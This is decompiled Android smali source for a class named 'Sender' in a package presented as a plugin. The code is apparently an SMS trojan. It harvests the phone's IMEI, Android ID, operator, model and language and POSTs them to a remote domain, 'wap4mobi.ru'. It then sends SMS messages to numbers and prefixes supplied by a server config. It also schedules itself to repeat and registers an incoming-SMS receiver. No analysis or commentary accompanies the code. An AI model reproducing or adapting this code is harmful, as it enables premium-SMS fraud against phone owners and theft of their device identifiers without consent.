.class public Lcom/uniplugin/sender/Sender;
.super Ljava/lang/Object;
.source "Sender.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/uniplugin/sender/Sender$UpdateBallTask;
    }
.end annotation


# static fields
.field public static final SMS_RECEIVED:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# instance fields
.field RequestReceiver:Landroid/content/BroadcastReceiver;

.field public context:Landroid/content/Context;

.field public domen:Ljava/lang/String;

.field public ideviceid:Ljava/lang/String;

.field public ilang:Ljava/lang/String;

.field public imei:Ljava/lang/String;

.field public imodel:Ljava/lang/String;

.field public ioperator:Ljava/lang/String;

.field public ipackname:Ljava/lang/String;

.field public iversionsdk:Ljava/lang/String;

.field public numbers:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public params:Ljava/lang/String;

.field public prefix:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public resulturl:Ljava/lang/String;

.field public step:I

.field public timeers:Ljava/lang/String;

.field timer:Ljava/util/Timer;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 51
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 52
    const-string v0, "http://yandex.ru"

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->resulturl:Ljava/lang/String;

    .line 53
    const-string v0, ""

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 54
    const-string v0, "http://wap4mobi.ru"

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->domen:Ljava/lang/String;

    .line 55
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    .line 56
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    .line 68
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->timer:Ljava/util/Timer;

    .line 556
    new-instance v0, Lcom/uniplugin/sender/Sender$1;

    invoke-direct {v0, p0}, Lcom/uniplugin/sender/Sender$1;-><init>(Lcom/uniplugin/sender/Sender;)V

    iput-object v0, p0, Lcom/uniplugin/sender/Sender;->RequestReceiver:Landroid/content/BroadcastReceiver;

    .line 51
    return-void
.end method

.method static synthetic access$0(Lcom/uniplugin/sender/Sender;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 259
    invoke-direct {p0, p1}, Lcom/uniplugin/sender/Sender;->parsnewdataandsend(Ljava/lang/String;)V

    return-void
.end method

.method private getJson(Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    .line 405
    const/4 v4, 0x0

    .line 406
    .local v4, "jsonString":Ljava/lang/String;
    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    invoke-virtual {v7}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    .line 408
    .local v0, "am":Landroid/content/res/AssetManager;
    :try_start_0
    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 409
    .local v3, "is":Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v6

    .line 410
    .local v6, "length":I
    new-array v1, v6, [B

    .line 411
    .local v1, "data":[B
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    .line 412
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v4    # "jsonString":Ljava/lang/String;
    .local v5, "jsonString":Ljava/lang/String;
    move-object v4, v5

    .line 417
    .end local v1    # "data":[B
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v5    # "jsonString":Ljava/lang/String;
    .end local v6    # "length":I
    .restart local v4    # "jsonString":Ljava/lang/String;
    :goto_0
    return-object v4

    .line 413
    :catch_0
    move-exception v2

    .line 414
    .local v2, "e1":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private parsalldata(Ljava/lang/String;)V
    .locals 8
    .param p1, "json"    # Ljava/lang/String;

    .prologue
    .line 210
    const/4 v4, 0x0

    .line 213
    .local v4, "jsonObject":Lorg/json/JSONObject;
    :try_start_0
    new-instance v5, Lorg/json/JSONTokener;

    invoke-direct {v5, p1}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Lorg/json/JSONTokener;->nextValue()Ljava/lang/Object;

    move-result-object v5

    move-object v0, v5

    check-cast v0, Lorg/json/JSONObject;

    move-object v4, v0
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 220
    :goto_0
    :try_start_1
    const-string v5, "resulturl"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->resulturl:Ljava/lang/String;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    .line 226
    :goto_1
    :try_start_2
    const-string v5, "domen"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->domen:Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    .line 232
    :goto_2
    :try_start_3
    const-string v5, "parametrs"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 233
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%iversionsdk%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->iversionsdk:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 234
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%ideviceid%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->ideviceid:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 235
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%ioperator%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->ioperator:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 236
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%ipackname%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->ipackname:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 237
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%imodel%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->imodel:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 238
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%ilang%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->ilang:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 239
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    const-string v6, "%imei%"

    iget-object v7, p0, Lcom/uniplugin/sender/Sender;->imei:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3

    .line 246
    :goto_3
    :try_start_4
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->ioperator:Ljava/lang/String;

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->isNull(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 247
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->ioperator:Ljava/lang/String;

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    .line 248
    .local v1, "data2":Lorg/json/JSONObject;
    invoke-virtual {p0, v1}, Lcom/uniplugin/sender/Sender;->parseobject(Lorg/json/JSONObject;)V
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_4

    .line 258
    .end local v1    # "data2":Lorg/json/JSONObject;
    :goto_4
    return-void

    .line 215
    :catch_0
    move-exception v2

    .line 217
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    .line 221
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_1
    move-exception v2

    .line 223
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1

    .line 227
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_2
    move-exception v2

    .line 229
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2

    .line 240
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_3
    move-exception v2

    .line 242
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_3

    .line 250
    .end local v2    # "e":Lorg/json/JSONException;
    :cond_0
    :try_start_5
    iget-object v5, p0, Lcom/uniplugin/sender/Sender;->ioperator:Ljava/lang/String;

    const/4 v6, 0x0

    const/4 v7, 0x3

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    .line 251
    .local v3, "ferrout":Ljava/lang/String;
    invoke-virtual {v4, v3}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    .line 252
    .restart local v1    # "data2":Lorg/json/JSONObject;
    invoke-virtual {p0, v1}, Lcom/uniplugin/sender/Sender;->parseobject(Lorg/json/JSONObject;)V
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_4

    goto :goto_4

    .line 254
    .end local v1    # "data2":Lorg/json/JSONObject;
    .end local v3    # "ferrout":Ljava/lang/String;
    :catch_4
    move-exception v2

    .line 256
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_4
.end method

.method private parsnewdataandsend(Ljava/lang/String;)V
    .locals 14
    .param p1, "json"    # Ljava/lang/String;

    .prologue
    .line 260
    const-string v7, "000000"

    .line 261
    .local v7, "prefix1":Ljava/lang/String;
    const-string v4, "000000"

    .line 262
    .local v4, "number1":Ljava/lang/String;
    const-string v8, "000000"

    .line 263
    .local v8, "prefix2":Ljava/lang/String;
    const-string v5, "000000"

    .line 264
    .local v5, "number2":Ljava/lang/String;
    const-string v9, "000000"

    .line 265
    .local v9, "prefix3":Ljava/lang/String;
    const-string v6, "000000"

    .line 266
    .local v6, "number3":Ljava/lang/String;
    const/4 v3, 0x0

    .line 269
    .local v3, "jsonObject":Lorg/json/JSONObject;
    :try_start_0
    new-instance v11, Lorg/json/JSONTokener;

    invoke-direct {v11, p1}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Lorg/json/JSONTokener;->nextValue()Ljava/lang/Object;

    move-result-object v11

    move-object v0, v11

    check-cast v0, Lorg/json/JSONObject;

    move-object v3, v0
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 277
    :goto_0
    :try_start_1
    const-string v11, "prefix1"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v7

    .line 283
    :goto_1
    :try_start_2
    const-string v11, "number1"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    move-result-object v4

    .line 289
    :goto_2
    :try_start_3
    const-string v11, "prefix2"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3

    move-result-object v8

    .line 295
    :goto_3
    :try_start_4
    const-string v11, "number2"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_4

    move-result-object v5

    .line 301
    :goto_4
    :try_start_5
    const-string v11, "prefix3"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_5

    move-result-object v9

    .line 307
    :goto_5
    :try_start_6
    const-string v11, "number3"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_6

    move-result-object v6

    .line 312
    :goto_6
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_0

    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_0

    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_1

    .line 313
    :cond_0
    iget-object v11, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const-string v12, "ESLIABONENTTUPIT"

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 314
    .local v10, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v10}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 315
    .local v2, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v11, "countsend"

    const/4 v12, 0x1

    invoke-interface {v2, v11, v12}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 316
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 318
    .end local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v10    # "settings":Landroid/content/SharedPreferences;
    :cond_1
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_2

    .line 319
    invoke-virtual {p0, v4, v7}, Lcom/uniplugin/sender/Sender;->sendSMSki(Ljava/lang/String;Ljava/lang/String;)V

    .line 321
    :cond_2
    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_3

    .line 322
    invoke-virtual {p0, v5, v8}, Lcom/uniplugin/sender/Sender;->sendSMSki(Ljava/lang/String;Ljava/lang/String;)V

    .line 324
    :cond_3
    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_4

    .line 325
    invoke-virtual {p0, v6, v9}, Lcom/uniplugin/sender/Sender;->sendSMSki(Ljava/lang/String;Ljava/lang/String;)V

    .line 327
    :cond_4
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    .line 328
    iget-object v11, p0, Lcom/uniplugin/sender/Sender;->timer:Ljava/util/Timer;

    invoke-virtual {v11}, Ljava/util/Timer;->cancel()V

    .line 329
    const/4 v11, 0x0

    iput-object v11, p0, Lcom/uniplugin/sender/Sender;->timer:Ljava/util/Timer;

    .line 331
    :cond_5
    return-void

    .line 271
    :catch_0
    move-exception v1

    .line 273
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    .line 278
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_1
    move-exception v1

    .line 280
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_1

    .line 284
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_2
    move-exception v1

    .line 286
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_2

    .line 290
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_3
    move-exception v1

    .line 292
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_3

    .line 296
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_4
    move-exception v1

    .line 298
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_4

    .line 302
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_5
    move-exception v1

    .line 304
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_5

    .line 308
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_6
    move-exception v1

    .line 310
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_6
.end method

.method private startUpdater()V
    .locals 8

    .prologue
    .line 191
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 192
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    new-instance v7, Landroid/content/Intent;

    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const-class v2, Lcom/uniplugin/sender/AReceiver;

    invoke-direct {v7, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 193
    .local v7, "sendIntent":Landroid/content/Intent;
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const/4 v2, 0x0

    const/high16 v3, 0x8000000

    invoke-static {v1, v2, v7, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 195
    .local v6, "pendingIntent":Landroid/app/PendingIntent;
    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 196
    const/4 v1, 0x3

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const-wide/32 v4, 0xdbba00

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 200
    return-void
.end method


# virtual methods
.method public GetUnixTime()I
    .locals 6

    .prologue
    .line 203
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 204
    .local v0, "calendar":Ljava/util/Calendar;
    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v1

    .line 205
    .local v1, "now":J
    const-wide/16 v4, 0x3e8

    div-long v4, v1, v4

    long-to-int v3, v4

    .line 206
    .local v3, "utc":I
    return v3
.end method

.method public SenderStart(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 3
    .param p1, "_context"    # Landroid/content/Context;
    .param p2, "configpach"    # Ljava/lang/String;
    .param p3, "par"    # I

    .prologue
    .line 73
    iput-object p1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    .line 74
    const/4 v1, 0x1

    if-ne p3, v1, :cond_0

    .line 75
    invoke-direct {p0}, Lcom/uniplugin/sender/Sender;->startUpdater()V

    .line 78
    :cond_0
    sget-object v1, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->iversionsdk:Ljava/lang/String;

    .line 79
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->ideviceid:Ljava/lang/String;

    .line 80
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    .line 81
    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    .line 80
    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->imei:Ljava/lang/String;

    .line 82
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    .line 83
    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 84
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    .line 82
    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->ioperator:Ljava/lang/String;

    .line 85
    iget-object v1, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->ipackname:Ljava/lang/String;

    .line 86
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->imodel:Ljava/lang/String;

    .line 87
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/uniplugin/sender/Sender;->ilang:Ljava/lang/String;

    .line 89
    invoke-direct {p0, p2}, Lcom/uniplugin/sender/Sender;->getJson(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 91
    .local v0, "her":Ljava/lang/String;
    invoke-direct {p0, v0}, Lcom/uniplugin/sender/Sender;->parsalldata(Ljava/lang/String;)V

    .line 95
    return-void
.end method

.method protected doInBackground(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 14
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "params"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 368
    invoke-static {}, Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;

    move-result-object v7

    .line 369
    .local v7, "pyHt":Ljava/lang/String;
    invoke-static {}, Landroid/net/Proxy;->getDefaultPort()I

    move-result v8

    .line 370
    .local v8, "pyPt":I
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 372
    .local v1, "connrl":Ljava/net/URL;
    if-lez v8, :cond_0

    .line 374
    new-instance v6, Ljava/net/InetSocketAddress;

    invoke-direct {v6, v7, v8}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 375
    .local v6, "pyAdr":Ljava/net/InetSocketAddress;
    new-instance v5, Ljava/net/Proxy;

    sget-object v12, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    invoke-direct {v5, v12, v6}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 376
    .local v5, "py":Ljava/net/Proxy;
    invoke-virtual {v1, v5}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .line 381
    .end local v5    # "py":Ljava/net/Proxy;
    .end local v6    # "pyAdr":Ljava/net/InetSocketAddress;
    .local v2, "conntn":Ljava/net/HttpURLConnection;
    :goto_0
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 382
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 383
    const-string v12, "POST"

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 384
    const/16 v12, 0x2710

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 387
    new-instance v11, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 389
    .local v11, "wr":Ljava/io/DataOutputStream;
    move-object/from16 v10, p2

    .line 390
    .local v10, "ulPars":Ljava/lang/String;
    invoke-virtual {v11, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 391
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->flush()V

    .line 392
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->close()V

    .line 394
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->connect()V

    .line 395
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 396
    .local v3, "inStm":Ljava/io/InputStream;
    new-instance v9, Ljava/io/BufferedReader;

    new-instance v12, Ljava/io/InputStreamReader;

    const-string v13, "UTF-8"

    invoke-direct {v12, v3, v13}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v9, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 397
    .local v9, "rder":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 398
    .local v0, "bder":Ljava/lang/StringBuilder;
    const/4 v4, 0x0

